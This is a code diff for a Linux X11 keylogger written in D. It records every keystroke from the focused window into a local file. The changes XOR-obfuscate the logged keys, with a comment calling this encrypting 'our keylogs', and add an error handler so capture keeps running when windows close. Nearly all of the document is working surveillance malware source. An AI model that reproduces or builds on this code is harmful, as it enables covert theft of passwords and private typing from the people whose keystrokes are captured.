@@ -5,10 +5,14 @@ import x11.Xlib;
 import x11.Xutil;
 import std.conv;
 import std.file;
+import std.array;
 
 enum saveFile = "test.txt";
+enum xorKey = "A";
+version = USEXOR;
 
 void main() {
+	XSetErrorHandler(&foo);
 	Display* d = XOpenDisplay(null);
     Window root = DefaultRootWindow(d);
     Window curFocus;
@@ -37,10 +41,10 @@ void main() {
 				len = XLookupString(&ev.xkey, buf.ptr, 16, &ks, &comp);
                 string pressedkey = getKey(cast(int)ks);
 				if (pressedkey != null) {
-					logKey(cast(void[])(pressedkey));
+					logKey(pressedkey);
 				} else {
                 	buf[len]=0;
-                	logKey(cast(void[])(to!string(buf[0])));
+                	logKey(to!string(buf[0]));
 				}
 				debug {
 					writefln("Key code: %d", cast(int)ks);
@@ -56,8 +60,11 @@ void main() {
     }
 }
 
-void logKey(void[] toWrite) {
-	std.file.append("test.txt", toWrite);
+void logKey(string key) {
+	version(USEXOR) {
+		key = xor(key, xorKey);
+	}
+	std.file.append(saveFile, cast(void[])(key ~ " "));
 }
 
 string getKey(int key) {
@@ -84,4 +91,26 @@ string getKey(int key) {
 		case 65535: return "[delete]";
 		default: return null;
 	}
+}
+
+// A xor to encrypt our keylogs
+string xor(string temp, string k) {
+    int x = 0;
+    string toReturn;
+    for (int i = 0; temp.length > i; i++) {
+        if (x > k.length - 1) {
+            x = 0;
+        }
+        toReturn = toReturn ~= temp[i] ^ k[x];
+        x++;
+    }
+    return toReturn;
+}
+
+// This func is here for when the user closes a window causing XGetInputFocus(d, &curFocus, &revert);
+// to throw a badWindow error. We just return 0 because there's no need to try to recover from the 
+// error as it will sort itself when the user clicks on a new window
+extern (C) int foo(_XDisplay*, XErrorEvent*) nothrow
+{
+    return 0;
 }
